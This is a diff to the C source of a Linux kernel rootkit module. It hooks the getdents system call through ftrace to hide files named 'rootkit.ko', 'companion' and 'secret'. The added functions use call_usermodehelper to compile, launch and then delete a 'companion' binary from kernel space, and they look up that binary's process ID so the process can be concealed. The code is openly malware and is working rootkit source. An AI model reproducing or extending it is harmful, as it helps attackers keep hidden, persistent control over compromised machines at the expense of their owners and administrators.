@@ -1,30 +1,50 @@
 #include "hide.h"
 
-void launch_companion(void) {
-    char *argv[] = {"/start_companion", NULL};
-    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+void compile_companion(void) {
+    char *argv[] = {"/usr/bin/gcc", "/root/companion.c", "-o", "bin/companion", NULL};
+    char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
     int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if (r) {
+    if (r >= 0) {
+      printk(KERN_INFO "Companion compiled\n");
+    } else {
+      printk(KERN_INFO "Fail %i\n", r);
+    }
+} 
+
+void launch_companion(void) {
+
+    char *argv[] = {"/bin/companion", NULL};
+    char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (r >= 0) {
       printk(KERN_INFO "Companion launched\n");
+    } else {
+      printk(KERN_INFO "Fail\n");
+    }
+}
+
+void delete_binary(void) {
+    char *argv[] = {"/bin/rm", "/bin/companion", NULL};
+    char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (r >= 0) {
+      printk(KERN_INFO "Companion removed\n");
+    } else {
+      printk(KERN_INFO "Fail\n");
     }
 }
 
 void get_pid_companion(void) {
     struct task_struct *task;
     pid_t pid_buff = -1;
-    printk(KERN_INFO "PLEASE");
     for_each_process(task) {
-      if (!strcmp(task->comm, "/bin/companion")) {
+      if (!strcmp(task->comm, "companion")) {
         g_pid_companion = task->pid;
-        printk(KERN_INFO "PLEASE2");
         break ;
       }
       pid_buff = task->pid;
     }
 }
-
-
-
 
 static int find_sys_call_addr(t_ftrace_hook *hook) {
     hook->address = kallsyms_lookup_name(hook->name);
@@ -132,7 +152,7 @@ asmlinkage long myGetDents(const struct pt_regs *regs) {
     
     void *dbuf = (void *)(dirent);
   //array of "string to hide"
-    char *string_to_hide[] = {"rootkit.ko", NULL};
+    char *string_to_hide[] = {"secret", "rootkit.ko", "companion", "companion.c", NULL};
     int to_hide = 0;
 
     while (dirent_idx + to_hide< getdent_ret) {
